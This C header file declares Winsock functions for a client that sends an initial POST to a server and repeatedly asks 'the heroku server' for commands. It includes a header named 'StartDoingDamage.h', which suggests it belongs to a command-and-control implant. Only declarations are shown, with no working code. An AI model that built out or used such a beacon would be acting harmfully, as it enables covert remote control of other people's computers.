#pragma once
#include "utilities.h"
#include "StartDoingDamage.h"


// function starts the socket and asks for commands to do every few seconds.
int start_socket();

// This function start the socket connection
int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* ConnectSocket);

// This function closes the connection socket
int close_socket(SOCKET* ConnectSocket);

// function sends POST http packet to the server -> first connection packet.
int send_first_commit_packet(SOCKET* s);


// function that asks the heroku server for commands.
int get_command(SOCKET* s, char** return_data);
